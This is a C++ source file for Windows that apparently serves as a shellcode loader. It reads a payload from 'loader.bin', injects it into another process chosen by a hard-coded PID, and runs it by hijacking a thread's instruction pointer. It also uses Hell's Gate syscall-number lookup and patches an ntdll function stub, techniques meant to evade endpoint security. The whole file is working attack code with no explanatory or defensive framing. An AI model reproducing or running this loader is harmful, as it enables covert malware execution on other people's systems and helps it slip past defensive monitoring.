#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <TlHelp32.h> // Added for thread snapshot functions

// Ensure these are not redefined
#undef _PEB
#undef _PROCESS_BASIC_INFORMATION
#undef _OSVERSIONINFOEXW

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

// Function to find the syscall number using Hell's Gate
DWORD FindSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);
    BYTE* pFunction = (BYTE*)funcAddr;

    for (int i = 0; i < 0x20; i++) {
        if (pFunction[i] == 0x0F && pFunction[i + 1] == 0x05) { // Look for "syscall"
            DWORD ssn = *(DWORD*)(pFunction + i - 4); // The syscall number is 4 bytes before
            return ssn;
        }
    }
    return 0;
}

bool ModifyFunctionToSyscall(DWORD ssn, FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD oldProtect;

    if (VirtualProtect(pFunction, 10, PAGE_READWRITE, &oldProtect)) {
        pFunction[0] = 0xB8;
        *reinterpret_cast<DWORD*>(&pFunction[1]) = ssn;
        pFunction[5] = 0x0F;
        pFunction[6] = 0x05;
        pFunction[7] = 0xC3;

        VirtualProtect(pFunction, 10, PAGE_EXECUTE_READ, &oldProtect);
        return true;
    }
    return false;
}

bool VerifyModification(FARPROC funcAddr, DWORD expectedSSN) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    DWORD ssn = *reinterpret_cast<DWORD*>(&pFunction[1]);
    return pFunction[0] == 0xB8 && ssn == expectedSSN;
}

DWORD GetCurrentSSN(FARPROC funcAddr) {
    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);
    return *reinterpret_cast<DWORD*>(&pFunction[1]);
}

void SetHardwareBreakpoint(FARPROC funcAddr, DWORD registerIndex) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    (&ctx.Dr0)[registerIndex] = (DWORD_PTR)funcAddr;

    ctx.Dr7 |= (1 << (2 * registerIndex));

    SetThreadContext(hThread, &ctx);
}

void UpdateRAXandContinue(FARPROC funcAddr, DWORD newSSN) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;

    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    ctx.Rax = newSSN;

    ctx.Rip = (DWORD_PTR)funcAddr + 0x8;

    SetThreadContext(hThread, &ctx);
}

int main() {
    DWORD targetPID = 1608; // Replace with the PID of the process you want to inject

    // Using Hell's Gate to find the SSN of NtAllocateVirtualMemory
    DWORD ssnNtAllocateVirtualMemory = FindSyscallNumber("NtAllocateVirtualMemory");
    DWORD ssnNtDrawText = FindSyscallNumber("NtDrawText");

    std::cout << "SSN of NtAllocateVirtualMemory: " << ssnNtAllocateVirtualMemory << std::endl;
    std::cout << "SSN of NtDrawText: " << ssnNtDrawText << std::endl;

    FARPROC addrNtDrawText = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDrawText");
    std::cout << "Address of NtDrawText: " << addrNtDrawText << std::endl;

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            std::cout << "NtDrawText was successfully modified to use the SSN of NtAllocateVirtualMemory!" << std::endl;
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "The new SSN of NtDrawText is: " << currentSSN << std::endl;
        }
        else {
            std::cout << "Failed to modify NtDrawText to use the SSN of NtAllocateVirtualMemory" << std::endl;
        }
    }

    // Load shellcode from a file
    std::ifstream shellcodeFile("loader.bin", std::ios::binary | std::ios::ate);
    if (!shellcodeFile.is_open()) {
        std::cerr << "Failed to open shellcode file." << std::endl;
        return 1;
    }

    std::streamsize fileSize = shellcodeFile.tellg();
    shellcodeFile.seekg(0, std::ios::beg);

    std::vector<char> shellcode(fileSize);
    if (!shellcodeFile.read(shellcode.data(), fileSize)) {
        std::cerr << "Failed to read the shellcode from file." << std::endl;
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
        );

    typedef NTSTATUS(NTAPI* pfnNtProtectVirtualMemory)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
        );

    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pfnNtProtectVirtualMemory NtProtectVirtualMemory = (pfnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return 1;
    }

    PVOID remoteMemory = nullptr;
    SIZE_T shellcodeSize = shellcode.size();
    NTSTATUS allocStatus = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (allocStatus != STATUS_SUCCESS) {
        std::cerr << "Memory allocation failed: " << allocStatus << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcodeSize, &written)) {
        std::cerr << "Failed to write shellcode: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    DWORD oldProtect;
    NTSTATUS protectStatus = NtProtectVirtualMemory(hProcess, &remoteMemory, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (protectStatus != STATUS_SUCCESS) {
        std::cerr << "Failed to change memory protection: " << protectStatus << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot (of threads) failed" << std::endl;
        return 1;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hThreadSnap, &te32)) {
        std::cerr << "Thread32First failed" << std::endl;
        CloseHandle(hThreadSnap);
        return 1;
    }

    HANDLE hThread = NULL;
    do {
        if (te32.th32OwnerProcessID == targetPID) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (hThread) break;
        }
    } while (Thread32Next(hThreadSnap, &te32));

    CloseHandle(hThreadSnap);

    if (hThread == NULL) {
        std::cerr << "Failed to open thread" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    SuspendThread(hThread);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    ctx.Rip = (DWORD_PTR)remoteMemory;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    if (addrNtDrawText != nullptr) {
        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&
            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {
            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);
            std::cout << "The new SSN of NtDrawText is: " << currentSSN << std::endl;
            std::cout << "NtDrawText was successfully modified to use the SSN of NtAllocateVirtualMemory!" << std::endl;
            SetHardwareBreakpoint(addrNtDrawText, 0);
            typedef void (*FuncType)();
            FuncType callNtDrawText = (FuncType)addrNtDrawText;
            callNtDrawText();

            UpdateRAXandContinue(addrNtDrawText, ssnNtAllocateVirtualMemory);
        }
        else {
            std::cout << "Failed to modify NtDrawText." << std::endl;
        }
    }

    return 0;
}
